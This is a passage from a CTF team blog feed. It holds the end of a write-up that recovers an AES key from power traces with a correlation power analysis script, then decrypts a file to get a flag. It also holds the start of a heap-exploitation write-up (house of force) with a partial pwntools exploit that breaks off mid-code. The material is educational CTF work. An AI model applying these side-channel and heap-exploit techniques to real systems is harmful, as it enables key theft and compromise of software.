<strong>Y</strong>.</p><p>Calculation the means:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Mean of hypothesis</span></span><br><span class="line">meanh = np.mean(hyp, dtype=np.float64)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Mean of all points in trace</span></span><br><span class="line">meant = np.mean(traces, axis=<span class="number">0</span>, dtype=np.float64)</span><br></pre></td></tr></table></figure><p>Now calculating the summations in the formula and performing the square root:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#For each trace, do the following</span></span><br><span class="line"><span class="keyword">for</span> tnum <span class="keyword">in</span> range(<span class="number">0</span>, numtraces):</span><br><span class="line">    hdiff = (hyp[tnum] - meanh)</span><br><span class="line">    tdiff = traces[tnum,:] - meant</span><br><span class="line"></span><br><span class="line">    sumnum = sumnum + (hdiff*tdiff)</span><br><span class="line">    sumden1 = sumden1 + hdiff*hdiff </span><br><span class="line">    sumden2 = sumden2 + tdiff*tdiff</span><br><span class="line"></span><br><span class="line">cpaoutput[kguess] = sumnum / np.sqrt( sumden1 * sumden2 )</span><br><span class="line">maxcpa[kguess] = max(abs(cpaoutput[kguess]))</span><br></pre></td></tr></table></figure><p>So after calculating the correlation for every key guess the best guess key is the one with highest value of correlation:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bestguess[bnum] = np.argmax(maxcpa)</span><br></pre></td></tr></table></figure><p>In the end we get the complete key used in the encryption, the full script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">HW = [bin(n).count(<span class="string">"1"</span>) <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line">sbox=(</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,</span><br><span class="line"><span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,</span><br><span class="line"><span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,</span><br><span class="line"><span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,</span><br><span class="line"><span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,</span><br><span class="line"><span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,</span><br><span class="line"><span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,</span><br><span class="line"><span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,</span><br><span class="line"><span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,</span><br><span class="line"><span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intermediate</span><span class="params">(pt, keyguess)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sbox[pt ^ keyguess]</span><br><span class="line"></span><br><span class="line">traces = np.load(<span class="string">'powertraces.npy'</span>)</span><br><span class="line">pt = np.load(<span class="string">'plaintexts.npy'</span>)</span><br><span class="line"></span><br><span class="line">bestguess = []</span><br><span class="line"><span class="keyword">if</span> bestguess == []:</span><br><span class="line"></span><br><span class="line">    numtraces = np.shape(traces)[<span class="number">0</span>]<span class="number">-1</span></span><br><span class="line">    numpoint = np.shape(traces)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    bestguess = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> bnum <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">        cpaoutput = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">        maxcpa = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> kguess <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="comment">#Initialize arrays &amp; variables to zero</span></span><br><span class="line">            sumnum = np.zeros(numpoint)</span><br><span class="line">            sumden1 = np.zeros(numpoint)</span><br><span class="line">            sumden2 = np.zeros(numpoint)</span><br><span class="line"></span><br><span class="line">            hyp = np.zeros(numtraces)</span><br><span class="line">            <span class="keyword">for</span> tnum <span class="keyword">in</span> range(<span class="number">0</span>, numtraces):</span><br><span class="line">                hyp[tnum] = HW[intermediate(pt[tnum][bnum], kguess)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">#Mean of hypothesis</span></span><br><span class="line">            meanh = np.mean(hyp, dtype=np.float64)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#Mean of all points in trace</span></span><br><span class="line">            meant = np.mean(traces, axis=<span class="number">0</span>, dtype=np.float64)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#For each trace, do the following</span></span><br><span class="line">            <span class="keyword">for</span> tnum <span class="keyword">in</span> range(<span class="number">0</span>, numtraces):</span><br><span class="line">                hdiff = (hyp[tnum] - meanh)</span><br><span class="line">                tdiff = traces[tnum,:] - meant</span><br><span class="line"></span><br><span class="line">                sumnum = sumnum + (hdiff*tdiff)</span><br><span class="line">                sumden1 = sumden1 + hdiff*hdiff </span><br><span class="line">                sumden2 = sumden2 + tdiff*tdiff</span><br><span class="line"></span><br><span class="line">            cpaoutput[kguess] = sumnum / np.sqrt( sumden1 * sumden2 )</span><br><span class="line">            maxcpa[kguess] = max(abs(cpaoutput[kguess]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        bestguess[bnum] = np.argmax(maxcpa)</span><br><span class="line"></span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> bestguess: </span><br><span class="line">        key += <span class="string">"%02x"</span>%b</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Best Key Guess: %s"</span> % key</span><br></pre></td></tr></table></figure><p>Running it : </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python leak_power.py</span><br><span class="line">Best Key Guess: d2dea057d1145f456796966024a703b2</span><br></pre></td></tr></table></figure><p>The key is <strong>d2dea057d1145f456796966024a703b2</strong> now that we have the key we can decrypt the cyphertext, we can do this ith a few lines of <strong>go</strong>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io/ioutil"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line"><span class="string">"gopkg.in/square/go-jose.v2"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read input from file</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readInput</span><span class="params">(path <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> bytes []<span class="keyword">byte</span></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">bytes, err = ioutil.ReadFile(path)</span><br><span class="line">exitOnError(err, <span class="string">"unable to read input"</span>)</span><br><span class="line"><span class="keyword">return</span> bytes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Exit and print error message if we encountered a problem</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">exitOnError</span><span class="params">(err error, msg <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">"%s: %s\n"</span>, msg, err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">obj, err := jose.ParseEncrypted(<span class="keyword">string</span>(readInput(<span class="string">"instructions_corrected.jwe"</span>)))</span><br><span class="line">exitOnError(err, <span class="string">"unable to parse message"</span>)</span><br><span class="line">plaintext, err := obj.Decrypt(<span class="string">"\xd2\xde\xa0\x57\xd1\x14\x5f\x45\x67\x96\x96\x60\x24\xa7\x03\xb2"</span>)</span><br><span class="line">exitOnError(err, <span class="string">"unable to decrypt message"</span>)</span><br><span class="line">fmt.Print(<span class="keyword">string</span>(plaintext))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Running it we get the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ go get gopkg.in/square/go-jose.v2</span><br><span class="line">$ go run aes_dec.go</span><br><span class="line">CONFIDENTIAL</span><br><span class="line"></span><br><span class="line">To <span class="built_in">disable</span> C4, you will need:</span><br><span class="line">- 6 bits of Dragon Sumac</span><br><span class="line">- 1 nibble of Winter Spice</span><br><span class="line">- 1 byte of Drake Cardamom</span><br><span class="line">- 1 flag with value flag-e2f27bac480a7857de45</span><br><span class="line">- 2 diskfulls of Tundra Chives</span><br><span class="line">- 5 forks</span><br><span class="line"></span><br><span class="line">Grind the Dragon Sumac <span class="keyword">in</span> a cup, making sure you don<span class="string">'t break the cup as it'</span>s probably a delicate cup. Add a sprinkle of</span><br><span class="line">liquid ice to turn it into a cream-like paste, <span class="keyword">then</span> add the Winter Spice, first almost everything, <span class="keyword">then</span> the last tiny</span><br><span class="line">remnants.</span><br><span class="line"></span><br><span class="line">Fill a pan with elemental water, add the mixture and cool it down with how cool you are, <span class="keyword">then</span> bring the mixture</span><br><span class="line">to a boil. Let it cool down to the body temperature of a reptile before adding the Drake Cardamom and Tundra Chives,</span><br><span class="line">all at once of one, <span class="keyword">then</span> half at a time of the other.</span><br><span class="line"></span><br><span class="line">Bring everything back to a boil, turn of the heat, mix with the forks and <span class="built_in">let</span> everything cool down. If you</span><br><span class="line">touch the liquid and it burns you, it hasn<span class="string">'t cooled down enough.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Whisk the mixture heavily to aerate it. Stop when it'</span>s frothy.</span><br><span class="line"></span><br><span class="line">Drinking the potion will <span class="built_in">disable</span> C4.</span><br><span class="line"></span><br><span class="line">note: A small, but very cold amount is needed <span class="keyword">for</span> the potion to be effective. Mixing it <span class="keyword">in</span> a milkshake could work, but</span><br><span class="line">be wary of brain freeze.</span><br></pre></td></tr></table></figure><p>The flag was <strong>flag-e2f27bac480a7857de45</strong></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://www.tandfonline.com/doi/full/10.1080/23742917.2016.1231523" target="_blank" rel="noopener">https://www.tandfonline.com/doi/full/10.1080/23742917.2016.1231523</a></li><li><a href="https://wiki.newae.com/Making_Scripts" target="_blank" rel="noopener">https://wiki.newae.com/Making_Scripts</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;C4: leaky power&lt;br&gt;222&lt;br&gt;&lt;br&gt;C4 is a very advanced AES based defensive system. You are able to monitor the power lines. Is 
      
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="aes" scheme="https://teamrocketist.github.io/tags/aes/"/>
    
      <category term="cpa" scheme="https://teamrocketist.github.io/tags/cpa/"/>
    
      <category term="power_analysis" scheme="https://teamrocketist.github.io/tags/power-analysis/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] inCTF 2017 - Gryffindor</title>
    <link href="https://teamrocketist.github.io/2018/11/08/Pwn-inCTF-2017-Gryffindor/"/>
    <id>https://teamrocketist.github.io/2018/11/08/Pwn-inCTF-2017-Gryffindor/</id>
    <published>2018-11-08T06:21:03.000Z</published>
    <updated>2018-11-26T01:11:07.210Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://mega.nz/#!XvInEABK!7R3-Hbl7dGY-7FGVuTxP25NkQfd5OQBn6P9thxk3l7U" target="_blank" rel="noopener">gryffindor</a><br><a href="https://mega.nz/#!z3An1Y5b!eY7eK3OYBLU3jFtOq3ZUrwiXWJzw2UGXyVOJDDS4qn8" target="_blank" rel="noopener">libc.so.6</a></p><p>I’ve been looking at attacks on the heap lately, since I didn’t do any kind of write-up about this I ended up looking for an old ctf challenge from inCTF 2017, I did solved this challenge some days after the ctf (not during it) but back in the day I didn’t have the time to do a write about this.</p><p>The binary in this challenge was an <strong>ELF 64-bit</strong>, first thing we are likely to look up is for it’s security:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec gryffindor</span><br><span class="line">[*] <span class="string">'/ctf/work/ctf/inctf2017/pwn/gryffindor/gryffindor'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO </span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p><p>Now after this we want to run the binary itself so we can see what it does, the application present us with a menu which gives us 4 options: </p><ol><li>We can create a new item where we can specify the input <strong>allocation size</strong> and the <strong>index</strong>. </li><li>We can delete an item by stipulating it’s <strong>index</strong>.</li><li>We can edit an item by indicating it’s <strong>index</strong> then we can modify it’s content by giving it a size and the string itself.</li><li>Finally we have an option to exit the binary</li></ol><p>By checking the <strong>add</strong> for option 1 we can already see some interesting things : </p><p><a data-fancybox="gallery" href="https://i.imgur.com/e6qQoth.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/e6qQoth.png" alt=""><br></a></p><p>Now checking the <strong>delete</strong> option 2, doesn’t look we have any kind of vulnerabilities:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/cDtma4l.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/cDtma4l.png" alt=""><br></a></p><p>Finally on option 3 <strong>edit</strong> we can find a <strong>heap overflow</strong> vulnerability:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/nkup5nJ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/nkup5nJ.png" alt=""><br></a></p><h2 id="House-of-Force-the-Jedi-Overflow"><a href="#House-of-Force-the-Jedi-Overflow" class="headerlink" title="House of Force the Jedi Overflow"></a>House of Force the Jedi Overflow</h2><p>This attack focuses on making <strong>malloc</strong> return an arbitrary pointer, we can achieve this by exploiting the <strong>top_chunk</strong>… The top most chunk also known as the ‘wilderness’. This assumes an overflow into the top chunk’s header (we have an overflow as we saw in option 3), if we can overflow and modify the top_chunk <strong>size</strong> into a very large value, all the initial requests will be services using the top chunk, instead of relying on <strong>mmap</strong>. If we set it into <strong>-1</strong> this will be evaluated into <strong>0xFFFFFFFFFFFFFFFF</strong> in a 64 bit binary.</p><p>Assuming we as the attackers want to make make <strong>malloc</strong> to return an address <strong>p</strong>, after we set the size into <strong>-1</strong> any malloc call with the size of <strong>P- &amp;top_chunk</strong> will return <strong>P</strong> as a pointer to that address.</p><p>If we force <strong>malloc</strong> to return a pointer of our choice we will gain an arbitrary write to that address.</p><p>The Ingredients to perform this attack can be looked as follows:</p><ul><li>The exploiter must be able to overwrite the top chunk (i.e. the overflow must happen in a chunk that allows to overwrite the wilderness).</li><li>There is a malloc() call with an exploiter-controllable size.</li><li>There is another malloc() call where data are controlled by the exploiter.</li><li>A leaked heap address so we can calculate the size required to force malloc return the address we want.</li></ul><p>As we can look above we have almost everything, the only thing’s missing is the last point we don’t have any heap address leaked and after our analysis there isn’t any kind of vulnerability to leak any kind of addresses… Well we missed this function:<br><a data-fancybox="gallery" href="https://i.imgur.com/xel89OL.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/xel89OL.png" alt=""><br></a><br>As we can see above the author of the challenge was nice enough to give us the a leak for free.</p><h2 id="Replace-atoi-with-printf-for-format-string-vulnerability"><a href="#Replace-atoi-with-printf-for-format-string-vulnerability" class="headerlink" title="Replace atoi with printf for format string vulnerability"></a>Replace atoi with printf for format string vulnerability</h2><p>Now that we have all the ingredients we can put <strong>house of force</strong> into practice, first lets write some functions <strong>add</strong> and <strong>edit</strong> options, and extract the heap address:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_g</span><span class="params">(size, index)</span>:</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(size)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_g</span><span class="params">(size, index, inp, choice=<span class="string">'3'</span>)</span>:</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(choice)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(index)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(size)</span><br><span class="line">    r.sendline(inp)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">binary = ELF(<span class="string">'./gryffindor'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">r = process(<span class="string">'./gryffindor'</span>, env=&#123;<span class="string">'LD_LIBRARY_PATH'</span>: os.path.join(os.getcwd(),<span class="string">"./libc.so.6"</span>)+<span class="string">" "</span>+sys.path[<span class="number">0</span>]&#125;)</span><br><span class="line"><span class="comment">#gdb.attach(r, """</span></span><br><span class="line"><span class="comment">#   b *0x400bd9</span></span><br><span class="line"><span class="comment">#   """)</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'1337'</span>)</span><br><span class="line">heap = int(r.recv(<span class="number">9</span>),<span class="number">16</span>)+<span class="number">0x1b0</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED HEAP 0x%x'</span> % (heap))</span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'0'</span>)</span><br></pre></td></tr></table></figure><p>The 0x1b0 offset which is offset to <strong>top_chunk</strong> can be calculated as follows:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/CKTIig9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/CKTIig9.png" alt=""><br></a></p><p><strong>Overflowing wilderness size</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># HOUSE OF FORCE</span></span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'0'</span>)</span><br><span class="line">edit_g(str(<span class="number">18</span>*<span class="number">8</span>), <span class="string">'0'</span>,<span class="string">'A'</span>*<span class="number">17</span>*<span class="number">8</span> + p64(<span 